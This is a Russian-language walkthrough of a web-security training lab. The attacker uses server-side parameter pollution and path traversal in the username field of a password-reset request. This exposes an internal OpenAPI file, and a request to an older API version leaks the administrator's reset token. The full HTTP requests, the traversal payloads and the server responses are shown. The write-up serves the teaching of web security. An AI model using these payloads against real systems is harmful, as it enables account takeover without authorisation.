
## Дано

#### Требуемые знания
Чтобы решить эту лабораторию, вам нужно знать:

- Как определить, включен ли пользовательский ввод в путь URL-адреса на стороне сервера или строку запроса.
- Как использовать последовательности прохождения пути, чтобы попытаться изменить запрос на стороне сервера.
- Как открыть документацию API.

## Задача

войти в систему как `administrator` и удалить `carlos`

# Разведка


- При ответе видим указание скрипта из файла js fgorgotPassword, где есть путь `/forgot-password?passwordResetToken=${resetToken}` - для сброса пароля

- Формат запроса на смену пароля
```
POST /forgot-password HTTP/2
Host: 0a57007a03910d878062bc5a004200a4.web-security-academy.net
Cookie: session=ap2WUdUM9FMgpW5HpahXQ2KM3b9wQnTG
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://0a57007a03910d878062bc5a004200a4.web-security-academy.net/forgot-password
Content-Type: x-www-form-urlencoded
Content-Length: 60
Origin: https://0a57007a03910d878062bc5a004200a4.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Sec-Gpc: 1
Priority: u=0
Te: trailers

csrf=pmwFBzcNJq1KLGEbAZGBxHKIJmUMXvEb&username=administrator
```

- Пробуем спец символы 
	`#` - комментирует всё то что после
	`&` - оператор и, объединяет запрос
	`=` - оператор присваивания 
Загрязнение работает судя по ответам

## Атака

Пробуем узнать про API при помощи загрязнения
- Проверка на обход пути работает `username=../../../../administrator`
Ответ
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Not Found</title>
</head>
<body>
    <h1>Not found</h1>
    <p>The URL that you requested was not found.</p>
</body>
</html>
```

- Можем предположить что нам надо пробрутить запрос чтоб найти апи документацию
Запрос
```
POST /forgot-password HTTP/2
Host: 0a57007a03910d878062bc5a004200a4.web-security-academy.net
Cookie: session=ap2WUdUM9FMgpW5HpahXQ2KM3b9wQnTG
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://0a57007a03910d878062bc5a004200a4.web-security-academy.net/forgot-password
Content-Type: x-www-form-urlencoded
Content-Length: 72
Origin: https://0a57007a03910d878062bc5a004200a4.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Sec-Gpc: 1
Priority: u=0
Te: trailers

csrf=pmwFBzcNJq1KLGEbAZGBxHKIJmUMXvEb&username=../../../../administrator
```
administartor - payload
- Нашли ток `api` - ответ 404 `Invalid route. Please refer to the API definition`
- Нашли по `username=../../../../openapi.json%23%`
Ответ
```
{
  "openapi": "3.0.0",
  "info": {
    "title": "User API",
    "version": "2.0.0"
  },
  "paths": {
    "/api/internal/v1/users/{username}/field/{field}": {
      "get": {
        "tags": [
          "users"
        ],
        "summary": "Find user by username",
        "description": "API Version 1",
        "parameters": [
          {
            "name": "username",
            "in": "path",
            "description": "Username",
            "required": true,
            "schema": {
              ...
            }
```

- "This version of API only supports the email field for security reasons" - обходим версию
	`username=../../v1/users/administrator/field/passwordResetToken%23`
```
{
  "type": "passwordResetToken",
  "result": "2q4gknen4nngdo53zl8iht0jz8wneu1h"
}
```